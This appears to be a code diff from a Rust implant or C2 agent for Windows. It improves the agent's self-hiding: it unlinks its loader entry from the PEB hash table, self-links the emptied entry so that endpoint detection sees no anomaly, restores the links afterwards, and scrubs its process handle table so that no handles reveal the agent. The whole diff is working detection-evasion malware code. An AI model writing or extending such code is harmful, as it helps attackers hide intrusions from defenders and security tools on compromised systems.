@@ -32,8 +32,8 @@ use std::sync::OnceLock;
 /// Thread information class: ThreadQuerySetWin32StartAddress (0x09).
 const THREAD_QUERY_SET_WIN32_START_ADDRESS: u32 = 9;
 
-/// System information class: SystemHandleInformation (0x10).
-const SYSTEM_HANDLE_INFORMATION: u32 = 0x10;
+/// System information class: SystemExtendedHandleInformation (0x40).
+const SYSTEM_HANDLE_INFORMATION: u32 = 0x40;
 
 /// Process access rights for NtOpenProcess in handle scanning.
 const PROCESS_DUP_HANDLE: u64 = 0x0040;
@@ -119,6 +119,9 @@ struct SavedPebLinks {
     /// InInitializationOrderLinks Flink/Blink.
     init_flink: usize,
     init_blink: usize,
+    /// HashLinks Flink/Blink (LDR hash table).
+    hash_flink: usize,
+    hash_blink: usize,
     /// Original DllBase.
     dll_base: usize,
     /// Original EntryPoint.
@@ -533,15 +536,26 @@ unsafe fn flush_ldr_hash_table(ldr: *mut u8, image_base: usize) {
             let dll_base = *((entry_base + OFF_DLL_BASE) as *const usize);
 
             if dll_base == image_base {
-                // Found our entry in this hash bucket.  Unlink it.
+                // Found our entry in this hash bucket.  Save original links
+                // and unlink it.
                 let flink = *(current as *const usize);
                 let blink = *((current + 8) as *const usize);
+
+                // Save original hash links to thread-local storage.
+                SAVED_PEB_LINKS.with(|sl| {
+                    let mut saved = sl.borrow_mut();
+                    saved.hash_flink = flink;
+                    saved.hash_blink = blink;
+                });
+
                 if flink != 0 && blink != 0 {
                     unlink_list_entry(flink, blink);
                 }
-                // Zero the hash links.
-                *(current as *mut usize) = 0;
-                *((current + 8) as *mut usize) = 0;
+                // Self-link (circular) instead of zeroing — zeroed
+                // HashLinks are an EDR anomaly flag, but an empty
+                // self-referencing list head looks normal.
+                *(current as *mut usize) = current;
+                *((current + 8) as *mut usize) = current;
                 break;
             }
 
@@ -597,6 +611,15 @@ pub unsafe fn restore_peb_traces() {
             *(entry_ptr.add(0x28) as *mut usize) = saved.init_blink;
             *(saved.init_blink as *mut usize) = (entry_ptr as usize) + 0x20;
             *((saved.init_flink + 8) as *mut usize) = (entry_ptr as usize) + 0x20;
+        }
+
+        // Re-link HashLinks (LDR hash table).
+        if saved.hash_flink != 0 && saved.hash_blink != 0 {
+            let hash_ptr = entry_ptr.add(OFF_HASH_LINKS);
+            *(hash_ptr as *mut usize) = saved.hash_flink;
+            *((hash_ptr as usize + 8) as *mut usize) = saved.hash_blink;
+            *(saved.hash_blink as *mut usize) = hash_ptr as usize;
+            *((saved.hash_flink + 8) as *mut usize) = hash_ptr as usize;
         }
     });
 
@@ -757,20 +780,22 @@ unsafe fn resolve_legitimate_thread_start() -> usize {
 
 // ── Handle table scrubbing ───────────────────────────────────────────────────
 
-/// System handle table entry (SYSTEM_HANDLE_TABLE_ENTRY_INFO).
+/// System handle table entry (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX).
 #[repr(C)]
-struct SystemHandleEntry {
-    process_id: u16,
-    _object_type_index: u8,
-    _flags: u8,
-    handle: u16,
-    _object: *mut u8,
-    _granted_access: u32,
+struct SystemHandleEntryEx {
+    object: *mut std::ffi::c_void,
+    unique_process_id: usize,
+    unique_handle_value: usize,
+    granted_access: u32,
+    creator_back_trace_index: u16,
+    object_type_index: u16,
+    handle_attributes: u32,
+    reserved: u32,
 }
 
 /// Close or obfuscate handles that would reveal the agent.
 ///
-/// Uses `NtQuerySystemInformation(SystemHandleInformation)` to enumerate
+/// Uses `NtQuerySystemInformation(SystemExtendedHandleInformation)` to enumerate
 /// all handles in the current process.  For each handle that points to
 /// the agent's memory section:
 ///
@@ -826,42 +851,44 @@ pub unsafe fn scrub_handle_table() {
 
 /// Process the handle information buffer and close/swap agent handles.
 unsafe fn process_handle_entries(buf: &[u8], image_base: usize) {
-    if buf.len() < 4 {
+    if buf.len() < 16 {
         return;
     }
 
-    // SYSTEM_HANDLE_INFORMATION layout:
-    //   +0x00  NumberOfHandles (ULONG)
-    //   +0x04  Handles[]       (SYSTEM_HANDLE_TABLE_ENTRY_INFO[])
+    // SYSTEM_EXTENDED_HANDLE_INFORMATION layout:
+    //   +0x00  NumberOfHandles (ULONG_PTR, 8 bytes on x64)
+    //   +0x08  Reserved        (ULONG_PTR, 8 bytes)
+    //   +0x10  Handles[]       (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[])
     //
-    // SYSTEM_HANDLE_TABLE_ENTRY_INFO size is 24 bytes on x86-64:
-    //   +0x00  UniqueProcessId       (USHORT, 2 bytes)
-    //   +0x02  ObjectTypeIndex       (UCHAR, 1 byte)
-    //   +0x03  HandleAttributes      (UCHAR, 1 byte)
-    //   +0x04  HandleValue           (USHORT, 2 bytes)
-    //   +0x06  _padding              (2 bytes)
-    //   +0x08  Object                (PVOID, 8 bytes)
-    //   +0x10  GrantedAccess         (ULONG, 4 bytes)
-    //   +0x14  _padding              (4 bytes)
-    // Total: 24 bytes
+    // SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX size is 40 bytes on x64:
+    //   +0x00  Object                (PVOID, 8 bytes)
+    //   +0x08  UniqueProcessId       (ULONG_PTR, 8 bytes)
+    //   +0x10  HandleValue           (ULONG_PTR, 8 bytes)
+    //   +0x18  GrantedAccess         (ULONG, 4 bytes)
+    //   +0x1C  CreatorBackTraceIndex (USHORT, 2 bytes)
+    //   +0x1E  ObjectTypeIndex       (USHORT, 2 bytes)
+    //   +0x20  HandleAttributes      (ULONG, 4 bytes)
+    //   +0x24  Reserved             (ULONG, 4 bytes)
+    // Total: 40 bytes
 
-    let num_handles = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]) as usize;
-    let entry_size: usize = 24;
-    let expected_len = 4 + (num_handles * entry_size);
+    let num_handles = usize::from_le_bytes([
+        buf[0], buf[1], buf[2], buf[3], buf[4], buf[5], buf[6], buf[7],
+    ]);
+    let entry_size = std::mem::size_of::<SystemHandleEntryEx>();
+    let header_size: usize = 16; // count(8) + reserved(8)
+    let expected_len = header_size + (num_handles * entry_size);
 
     if buf.len() < expected_len {
         return;
     }
 
-    let pid = std::process::id() as u16;
+    let pid = std::process::id() as usize;
     let mut closed_count = 0u32;
     let mut swapped_count = 0u32;
 
     for i in 0..num_handles {
-        let offset = 4 + (i * entry_size);
-        let entry_pid = u16::from_le_bytes([buf[offset], buf[offset + 1]]);
-        let handle_val = u16::from_le_bytes([buf[offset + 4], buf[offset + 5]]);
-        let object_addr = usize::from_le_bytes([
+        let offset = header_size + (i * entry_size);
+        let entry_pid = usize::from_le_bytes([
             buf[offset + 8],
             buf[offset + 9],
             buf[offset + 10],
@@ -871,6 +898,26 @@ unsafe fn process_handle_entries(buf: &[u8], image_base: usize) {
             buf[offset + 14],
             buf[offset + 15],
         ]);
+        let handle_val = usize::from_le_bytes([
+            buf[offset + 16],
+            buf[offset + 17],
+            buf[offset + 18],
+            buf[offset + 19],
+            buf[offset + 20],
+            buf[offset + 21],
+            buf[offset + 22],
+            buf[offset + 23],
+        ]);
+        let object_addr = usize::from_le_bytes([
+            buf[offset],
+            buf[offset + 1],
+            buf[offset + 2],
+            buf[offset + 3],
+            buf[offset + 4],
+            buf[offset + 5],
+            buf[offset + 6],
+            buf[offset + 7],
+        ]);
 
         // Skip handles not belonging to our process.
         if entry_pid != pid {
@@ -878,8 +925,7 @@ unsafe fn process_handle_entries(buf: &[u8], image_base: usize) {
         }
 
         // Skip pseudo-handles (-1, -2).
-        let hv = handle_val as u32;
-        if hv == 0xFFFFFFFF || hv == 0xFFFFFFFE {
+        if handle_val == usize::MAX || handle_val == usize::MAX - 1 {
             continue;
         }
 
@@ -899,8 +945,8 @@ unsafe fn process_handle_entries(buf: &[u8], image_base: usize) {
 
         // For Section-type handles, try to query the section base and compare.
         // If we can't verify, skip (better to leave a handle than crash).
-        if is_section_handle_to_image(handle_val as usize, image_base) {
-            if let Some(s) = nt_close(handle_val as usize) {
+        if is_section_handle_to_image(handle_val, image_base) {
+            if let Some(s) = nt_close(handle_val) {
                 if s >= 0 {
                     closed_count += 1;
                 }
